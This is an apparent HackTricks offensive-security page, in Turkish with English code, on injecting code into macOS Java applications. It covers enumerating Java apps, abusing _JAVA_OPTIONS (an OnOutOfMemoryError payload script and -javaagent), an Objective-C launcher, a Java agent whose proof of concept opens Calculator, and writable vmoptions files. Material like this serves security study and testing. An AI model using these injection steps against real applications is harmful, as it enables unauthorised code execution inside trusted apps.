# macOS Java Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Enumerasyon

Sisteminizde yüklü Java uygulamalarını bulun. **Info.plist** içindeki Java uygulamalarının, **`java.`** dizesini içeren bazı Java parametrelerine sahip olduğu fark edilmiştir; bu nedenle şu şekilde arama yapabilirsiniz:
```bash
# Search only in /Applications folder
sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null

# Full search
sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
```
## \_JAVA_OPTIONS

**`_JAVA_OPTIONS`** env variable'ı, Java ile derlenmiş bir app'in çalıştırılması sırasında arbitrary Java parametreleri enjekte etmek için kullanılabilir:
```bash
# Write your payload in a script called /tmp/payload.sh
export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
```
Bunu mevcut terminalin child process'i olarak değil, yeni bir process olarak çalıştırmak için şunu kullanabilirsiniz:
```objectivec
#import <Foundation/Foundation.h>
// clang -fobjc-arc -framework Foundation invoker.m -o invoker

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Specify the file path and content
NSString *filePath = @"/tmp/payload.sh";
NSString *content = @"#!/bin/bash\n/Applications/iTerm.app/Contents/MacOS/iTerm2";

NSError *error = nil;

// Write content to the file
BOOL success = [content writeToFile:filePath
atomically:YES
encoding:NSUTF8StringEncoding
error:&error];

if (!success) {
NSLog(@"Error writing file at %@\n%@", filePath, [error localizedDescription]);
return 1;
}

NSLog(@"File written successfully to %@", filePath);

// Create a new task
NSTask *task = [[NSTask alloc] init];

/// Set the task's launch path to use the 'open' command
[task setLaunchPath:@"/usr/bin/open"];

// Arguments for the 'open' command, specifying the path to Android Studio
[task setArguments:@[@"/Applications/Android Studio.app"]];

// Define custom environment variables
NSDictionary *customEnvironment = @{
@"_JAVA_OPTIONS": @"-Xms2m -Xmx5m -XX:OnOutOfMemoryError=/tmp/payload.sh"
};

// Get the current environment and merge it with custom variables
NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary:[[NSProcessInfo processInfo] environment]];
[environment addEntriesFromDictionary:customEnvironment];

// Set the task's environment
[task setEnvironment:environment];

// Launch the task
[task launch];
}
return 0;
}
```
Ancak bu, çalıştırılan uygulamada bir hatayı tetikler; daha gizli bir yöntem, bir java agent oluşturup şunu kullanmaktır:
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
```
> [!CAUTION]
> Agent'i uygulamadan **farklı bir Java version** ile oluşturmak, hem agent'in hem de uygulamanın çalışmasının crash olmasına neden olabilir.

Agent şu konumlarda olabilir:
```java:Agent.java
import java.io.*;
import java.lang.instrument.*;

public class Agent {
public static void premain(String args, Instrumentation inst) {
try {
String[] commands = new String[] { "/usr/bin/open", "-a", "Calculator" };
Runtime.getRuntime().exec(commands);
}
catch (Exception err) {
err.printStackTrace();
}
}
}
```
Agent'ı derlemek için çalıştırın:
```bash
javac Agent.java # Create Agent.class
jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
```
`manifest.txt` ile:
```
Premain-Class: Agent
Agent-Class: Agent
Can-Redefine-Classes: true
Can-Retransform-Classes: true
```
Ardından ortam değişkenini export edin ve Java uygulamasını şu şekilde çalıştırın:
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
```
## vmoptions file

Bu file, Java çalıştırıldığında **Java params** belirtilmesini destekler. Önceki bazı trick'leri kullanarak Java params'lerini değiştirebilir ve **process'in arbitrary commands çalıştırmasını sağlayabilirsiniz**.\
Ayrıca bu file, `include` directory'si ile **başka file'ları da include edebilir**; dolayısıyla include edilen bir file'ı da değiştirebilirsiniz.

Dahası, bazı Java apps **birden fazla `vmoptions`** file'ı **load eder**.

Android Studio gibi bazı applications, bu file'ları **nerede aradıklarını output'larında belirtir**, örneğin:
```bash
/Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions

2023-12-13 19:53:23.920 studio[74913:581359] fullFileName is: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] fullFileName exists: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.921 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app.vmoptions
2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
```
Yapmıyorlarsa bunu şu komutla kolayca kontrol edebilirsiniz:
```bash
# Monitor
sudo eslogger lookup | grep vmoption # Give FDA to the Terminal

# Launch the Java app
/Applications/Android\ Studio.app/Contents/MacOS/studio
```
Bu örnekte Android Studio'nun **`/Applications/Android Studio.app.vmoptions`** dosyasını yüklemeye çalışması oldukça ilginçtir; burası **`admin` grubundaki herhangi bir kullanıcının yazma erişimine sahip olduğu** bir konumdur.

{{#include ../../../banners/hacktricks-training.md}}
